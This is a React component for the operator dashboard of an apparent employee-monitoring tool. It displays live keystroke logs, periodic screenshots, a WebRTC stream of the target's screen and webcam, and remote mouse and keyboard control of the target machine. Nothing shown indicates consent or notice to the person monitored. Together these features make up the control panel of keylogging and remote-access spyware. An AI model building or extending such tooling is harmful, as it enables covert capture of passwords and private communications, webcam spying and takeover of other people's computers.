import { useEffect, useState, useRef } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { supabase } from '../lib/supabase';
import { ArrowLeft, Video, Keyboard, Image as ImageIcon, Timer, Settings, Wifi, WifiOff, MonitorPlay, MousePointer2 } from 'lucide-react';

export default function EmployeeDetail() {
    const { id } = useParams();
    const navigate = useNavigate();

    // Data State
    const [employee, setEmployee] = useState(null);
    const [keylogs, setKeylogs] = useState([]);
    const [screenshots, setScreenshots] = useState([]);
    const [videos, setVideos] = useState([]);
    const [isOnline, setIsOnline] = useState(false);

    // WebRTC State
    const [isStreaming, setIsStreaming] = useState(false);
    const videoRef = useRef(null);
    const camRef = useRef(null);
    const pcRef = useRef(null);
    const channelRef = useRef(null);
    const controlChannelRef = useRef(null);

    // Settings
    const [settings, setSettings] = useState({ screenshot_interval: 300, video_duration: 10, screenshots_enabled: false });
    const [savingSettings, setSavingSettings] = useState(false);

    useEffect(() => {
        fetchEmployee();
        fetchInitialData();

        // Data Subscriptions
        const sub = supabase.channel(`employee-${id}`)
            .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'keylogs', filter: `employee_id=eq.${id}` },
                payload => setKeylogs(prev => [payload.new, ...prev]))
            .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'screenshots', filter: `employee_id=eq.${id}` },
                payload => setScreenshots(prev => [resolveUrl(payload.new, 'screenshots'), ...prev]))
            .subscribe();

        // Online Poll
        const interval = setInterval(() => {
            if (employee?.last_seen) {
                const diff = (new Date() - new Date(employee.last_seen)) / 1000;
                setIsOnline(diff < 60);
            }
        }, 5000);

        return () => {
            supabase.removeChannel(sub);
            clearInterval(interval);
            stopStream();
        }
    }, [id, employee?.last_seen]);

    const resolveUrl = (item, bucket) => ({ ...item, publicUrl: item.url.startsWith('http') ? item.url : supabase.storage.from(bucket).getPublicUrl(item.storage_path).data.publicUrl });

    const fetchEmployee = async () => {
        const { data } = await supabase.from('employees').select('*').eq('id', id).single();
        if (data) {
            setEmployee(data);
            if (data.settings) setSettings(data.settings);
            setIsOnline((new Date() - new Date(data.last_seen)) / 1000 < 60);
        }
    };

    const fetchInitialData = async () => {
        const k = await supabase.from('keylogs').select('*').eq('employee_id', id).order('captured_at', { ascending: false }).limit(50);
        if (k.data) setKeylogs(k.data);
        const s = await supabase.from('screenshots').select('*').eq('employee_id', id).order('created_at', { ascending: false }).limit(20);
        if (s.data) setScreenshots(s.data.map(i => resolveUrl(i, 'screenshots')));
    };

    const saveSettings = async () => {
        setSavingSettings(true);
        await supabase.from('employees').update({ settings }).eq('id', id);
        setSavingSettings(false);
        alert('Settings saved.');
    };

    // --- WebRTC Logic ---

    const startStream = async () => {
        setIsStreaming(true);

        const pc = new RTCPeerConnection({
            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
        });
        pcRef.current = pc;

        // Handle Tracks
        pc.ontrack = (event) => {
            console.log("Received Track:", event.track.kind);
            if (videoRef.current && !videoRef.current.srcObject) {
                // Assume first track is screen
                videoRef.current.srcObject = event.streams[0];
            } else if (camRef.current) {
                // Assume second is cam
                camRef.current.srcObject = event.streams[0];
            }
        };

        // Add Transceivers to receive video
        pc.addTransceiver('video', { direction: 'recvonly' }); // Screen
        pc.addTransceiver('video', { direction: 'recvonly' }); // Cam

        // Create Offer
        const offer = await pc.createOffer();
        await pc.setLocalDescription(offer);

        // Signaling Channel
        const channel = supabase.channel(`signaling-${id}`);
        channel.on('broadcast', { event: 'ANSWER' }, async (payload) => {
            console.log("Received ANSWER");
            const answer = new RTCSessionDescription(payload.payload);
            await pc.setRemoteDescription(answer);
        }).subscribe(async (status) => {
            if (status === 'SUBSCRIBED') {
                await channel.send({
                    type: 'broadcast',
                    event: 'OFFER',
                    payload: { sdp: offer.sdp, type: offer.type }
                });
            }
        });
        channelRef.current = channel;

        // Control Channel
        const ctrlChannel = supabase.channel(`control-${id}`);
        ctrlChannel.subscribe();
        controlChannelRef.current = ctrlChannel;
    };

    const stopStream = () => {
        if (pcRef.current) pcRef.current.close();
        if (channelRef.current) supabase.removeChannel(channelRef.current);
        if (controlChannelRef.current) supabase.removeChannel(controlChannelRef.current);
        setIsStreaming(false);
    };

    // --- Remote Control ---

    const handleMouseMove = (e) => {
        if (!controlChannelRef.current || !isStreaming) return;
        const rect = videoRef.current.getBoundingClientRect();
        const x = (e.clientX - rect.left) / rect.width;
        const y = (e.clientY - rect.top) / rect.height;

        controlChannelRef.current.send({
            type: 'broadcast',
            event: 'MOUSE_MOVE',
            payload: { x, y }
        });
    };

    const handleClick = (e) => {
        if (!controlChannelRef.current || !isStreaming) return;
        const rect = videoRef.current.getBoundingClientRect();
        const x = (e.clientX - rect.left) / rect.width;
        const y = (e.clientY - rect.top) / rect.height;

        controlChannelRef.current.send({
            type: 'broadcast',
            event: 'MOUSE_CLICK',
            payload: { x, y, button: 'left' }
        });
    };

    const handleKeyDown = (e) => {
        if (!controlChannelRef.current || !isStreaming) return;
        controlChannelRef.current.send({
            type: 'broadcast',
            event: 'KEY_PRESS',
            payload: { key: e.key }
        });
    };

    if (!employee) return <div className="p-8">Loading...</div>;

    return (
        <div className="p-8 max-w-[1600px] mx-auto space-y-6" onKeyDown={handleKeyDown} tabIndex={0}>

            {/* Header */}
            <div className="flex items-center justify-between">
                <button onClick={() => navigate('/')} className="flex items-center text-gray-500 hover:text-gray-900">
                    <ArrowLeft className="w-5 h-5 mr-1" /> Back
                </button>
                <div className="flex items-center gap-4">
                    <h1 className="text-2xl font-bold flex items-center gap-2">
                        {employee.hostname}
                        {isOnline ?
                            <span className="flex items-center gap-1 text-green-600 text-sm bg-green-100 px-2 py-0.5 rounded-full"><Wifi className="w-4 h-4" /> Online</span> :
                            <span className="flex items-center gap-1 text-gray-500 text-sm bg-gray-100 px-2 py-0.5 rounded-full"><WifiOff className="w-4 h-4" /> Offline</span>
                        }
                    </h1>
                </div>
            </div>

            {/* Main Grid */}
            <div className="grid grid-cols-12 gap-6 h-[80vh]">

                {/* Left Column: Remote Control (8/12) */}
                <div className="col-span-8 bg-black rounded-xl overflow-hidden relative border border-gray-800 flex flex-col items-center justify-center">
                    {!isStreaming ? (
                        <button
                            onClick={startStream}
                            className="bg-blue-600 hover:bg-blue-700 text-white px-6 py-3 rounded-lg flex items-center gap-2 text-lg shadow-lg"
                        >
                            <MonitorPlay className="w-6 h-6" /> Start Remote Session
                        </button>
                    ) : (
                        <div className="relative w-full h-full">
                            {/* Screen Stream */}
                            <video
                                ref={videoRef}
                                autoPlay
                                className="w-full h-full object-contain cursor-crosshair"
                                onMouseMove={handleMouseMove}
                                onClick={handleClick}
                            />

                            {/* Webcam PIP */}
                            <div className="absolute bottom-4 right-4 w-64 aspect-video bg-gray-900 rounded border border-gray-700 shadow-xl overflow-hidden">
                                <video ref={camRef} autoPlay className="w-full h-full object-cover" />
                            </div>

                            {/* Control Bar */}
                            <div className="absolute top-4 left-1/2 -translate-x-1/2 bg-gray-900/80 text-white px-4 py-2 rounded-full flex items-center gap-4 backdrop-blur-sm">
                                <span className="flex items-center gap-2 text-sm"><MousePointer2 className="w-4 h-4 text-green-400" /> Remote Control Active</span>
                                <button onClick={stopStream} className="bg-red-600 hover:bg-red-700 px-3 py-1 rounded text-xs">Stop</button>
                            </div>
                        </div>
                    )}
                </div>

                {/* Right Column: Keylogs & Config (4/12) */}
                <div className="col-span-4 space-y-6 flex flex-col h-full">

                    {/* Settings */}
                    <div className="bg-white p-4 rounded-xl shadow border border-gray-100">
                        <h3 className="font-semibold text-gray-700 flex items-center gap-2 mb-3">
                            <Settings className="w-4 h-4" /> Configuration
                        </h3>
                        <div className="space-y-3">
                            <label className="flex items-center justify-between text-sm text-gray-600">
                                Enable Screenshots
                                <input
                                    type="checkbox"
                                    checked={settings.screenshots_enabled}
                                    onChange={e => setSettings({ ...settings, screenshots_enabled: e.target.checked })}
                                    className="w-4 h-4"
                                />
                            </label>
                            <label className="flex items-center justify-between text-sm text-gray-600">
                                Interval (sec)
                                <input
                                    type="number"
                                    value={settings.screenshot_interval}
                                    onChange={e => setSettings({ ...settings, screenshot_interval: parseInt(e.target.value) })}
                                    className="border rounded p-1 w-20 text-right"
                                />
                            </label>
                            <button
                                onClick={saveSettings}
                                disabled={savingSettings}
                                className="w-full bg-gray-100 hover:bg-gray-200 text-gray-800 py-1.5 rounded text-sm transition"
                            >
                                {savingSettings ? 'Saving...' : 'Update Settings'}
                            </button>
                        </div>
                    </div>

                    {/* Keylogs Feed */}
                    <div className="bg-white p-4 rounded-xl shadow border border-gray-100 flex-1 flex flex-col min-h-0">
                        <h3 className="font-semibold text-gray-700 flex items-center gap-2 mb-3">
                            <Keyboard className="w-4 h-4" /> Live Keylogs
                        </h3>
                        <div className="bg-gray-50 p-3 rounded flex-1 overflow-y-auto font-mono text-xs space-y-2">
                            {keylogs.map(log => (
                                <div key={log.id} className="border-b border-gray-200 pb-1">
                                    <span className="text-gray-400 block" style={{ fontSize: '10px' }}>{new Date(log.captured_at).toLocaleTimeString()}</span>
                                    <div className="whitespace-pre-wrap break-words">{log.content}</div>
                                </div>
                            ))}
                        </div>
                    </div>

                    {/* Screenshots Preview */}
                    <div className="bg-white p-4 rounded-xl shadow border border-gray-100 h-48 flex flex-col">
                        <h3 className="font-semibold text-gray-700 flex items-center gap-2 mb-3">
                            <ImageIcon className="w-4 h-4" /> Recent Snaps
                        </h3>
                        <div className="flex gap-2 overflow-x-auto pb-2">
                            {screenshots.slice(0, 5).map(shot => (
                                <a key={shot.id} href={shot.publicUrl} target="_blank" rel="noreferrer" className="flex-shrink-0 w-24">
                                    <img src={shot.publicUrl} className="w-full h-16 object-cover rounded border" />
                                </a>
                            ))}
                        </div>
                    </div>

                </div>
            </div>
        </div>
    );
}
